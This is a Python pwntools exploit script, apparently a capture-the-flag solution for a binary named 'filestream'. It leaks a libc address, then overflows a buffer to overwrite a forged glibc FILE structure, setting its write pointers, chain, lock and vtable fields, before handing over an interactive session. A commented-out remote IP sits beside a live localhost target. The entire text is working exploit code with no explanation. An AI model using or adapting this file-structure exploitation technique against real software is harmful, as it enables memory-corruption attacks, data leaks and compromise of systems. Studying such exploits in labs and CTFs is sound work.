#!/usr/bin/python

from pwn import *

def exploit():
	global r

	r.recvuntil("gift: ")
	libc_leak = int(r.recvline(),16)
	libc.address = libc_leak - libc.symbols["printf"]
	log.info("printf: {}".format(hex(libc_leak)))
	log.info("libc base: {}".format(hex(libc.address)))
	log.info("_IO_file_jumps: {}".format(hex(libc.symbols["_IO_file_jumps"])))

	payload = 'a'*0x100
	payload += p64(0x602210)
	payload += p64(0)
	payload += p64(0xfbad2887) # flag

	payload += p64(0)
	payload += p64(0x6020c0) # _IO_read_end
	payload += p64(0)

	payload += p64(0x6020c0) # _IO_write_base
	payload += p64(0x6020c0+0x20) # _IO_write_ptr
	payload += p64(0)

	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0)

	payload += p64(0)
	payload += p64(libc.symbols["_IO_2_1_stdin_"]+0x200) # _chain

	payload += p64(1) # _fileno
	payload += p64(0xffffffffffffffff)

	payload += p64(0)
	payload += p64(libc.address + 0x3ed8c0) # _IO_stdfile_1_lock
	payload += p64(0xffffffffffffffff)

	payload += p64(0)
	payload += p64(0)
	payload += p64(libc.address + 0x3ed8c0) # _IO_stdfile_1_lock
	payload += p64(0)
	payload += p32(0xffffffff)
	payload += p32(0)

	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(libc.symbols["_IO_file_jumps"]) # vtable

	r.sendafter("text: ",payload)
	r.interactive()

# context.terminal = ["/mnt/d/wsl-terminal-tabbed/open-wsl.exe","-e"]
exe = ELF("./filestream")
libc = exe.libc

if len(sys.argv) < 2:
	r = gdb.debug([exe.path],gdbscript="""
		b *0x400bbb
		c
		b *_IO_do_write
		c
	""")
	# r = process([exe.path])
else:
	# r = remote("128.199.211.118",23337)
	r = remote("localhost",23337)

exploit()
